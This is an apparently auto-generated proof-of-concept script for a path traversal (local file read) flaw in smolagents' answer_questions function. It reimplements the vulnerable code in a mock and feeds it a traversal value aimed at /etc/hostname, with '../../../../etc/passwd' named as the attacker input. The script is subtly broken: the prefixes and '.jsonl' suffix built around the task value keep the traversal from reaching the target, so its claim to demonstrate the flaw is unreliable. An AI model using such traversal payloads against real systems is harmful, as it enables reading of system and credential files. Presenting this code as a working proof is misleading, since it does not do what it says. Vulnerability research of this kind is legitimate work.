#!/usr/bin/env python3
# PoC for smolagents (/tmp/smolagents)
# Path: lfi-027
# Sink: answer_questions
# Auto-generated — run with: python3 lfi_supply_task_like_answer_questions.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept for LFI in smolagents (answer_questions function).
The file_name is built via f-string without sanitization of path traversal
sequences in the 'task' parameter (and also action_type, date).
An attacker can set task to something like '../../../../etc/passwd'
to read arbitrary files.

This PoC demonstrates the vulnerability by creating a mock environment
and invoking the vulnerable function with a malicious task value.
It reads /etc/hostname (a safe, harmless file) to avoid unintended damage.
"""

import os
import json
import tempfile
import datetime
from pathlib import Path

# ----------------------------------------------------------------------
# Configuration – modify these to match your test environment
# ----------------------------------------------------------------------
# Choose a benign file to read (e.g., hostname, or /etc/issue)
TARGET_FILE = "/etc/hostname"
# Directory that will serve as the "safe output" folder
OUTPUT_DIR = tempfile.mkdtemp(prefix="smolagents_poc_")
# Parameters that an attacker controls
MALICIOUS_TASK = os.path.relpath(TARGET_FILE, OUTPUT_DIR)  # e.g., "../../../../etc/hostname"
ACTION_TYPE = "test_action"
DATE = "2025-03-28"
MOCK_MODEL_ID = "test_model"  # no slashes to keep things simple

# ----------------------------------------------------------------------
# Replicate the vulnerable logic from the source code
# ----------------------------------------------------------------------
def vulnerable_answer_questions(model_id, action_type, eval_ds, date, output_dir):
    """
    Simplified version of the actual answer_questions function.
    Only the parts relevant to path traversal are included.
    """
    for task in eval_ds:  # task is attacker-controlled (key in dict)
        # Build file_name with f-string – NO sanitization of task/action_type/date
        file_name = f"{output_dir}/{model_id.replace('/', '__')}__{action_type}__{task}__{date}.jsonl"
        print(f"[*] Constructed file_name: {file_name}")

        # This is the sink: open() used to read the file
        if os.path.exists(file_name):
            print("[!] File exists! Reading its contents...")
            with open(file_name, "r") as f:
                content = f.read()
                print(f"[+] Contents of '{file_name}':\n{content}")
                return content
        else:
            print(f"[-] File does not exist: {file_name}")

# ----------------------------------------------------------------------
# Main exploit demonstration
# ----------------------------------------------------------------------
def main():
    print("=== Proof-of-Concept: LFI in smolagents (answer_questions) ===\n")
    print(f"[*] Using output directory: {OUTPUT_DIR}")
    print(f"[*] Attempting to read: {TARGET_FILE}")
    print(f"[*] Malicious task value: {MALICIOUS_TASK}\n")

    # Prepare the eval_ds structure (attacker controls keys)
    # We only need one task entry.
    eval_ds = {MALICIOUS_TASK: []}

    # Invoke the vulnerable function
    try:
        vulnerable_answer_questions(
            model_id=MOCK_MODEL_ID,
            action_type=ACTION_TYPE,
            eval_ds=eval_ds,
            date=DATE,
            output_dir=OUTPUT_DIR
        )
    except PermissionError:
        print("[!] Permission denied – try a different target file (e.g., /etc/hostname)")
    except FileNotFoundError:
        print("[!] File not found – check path depth relative to OUTPUT_DIR")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")

    # Cleanup (optional)
    try:
        os.rmdir(OUTPUT_DIR)
    except OSError:
        pass

if __name__ == "__main__":
    main()
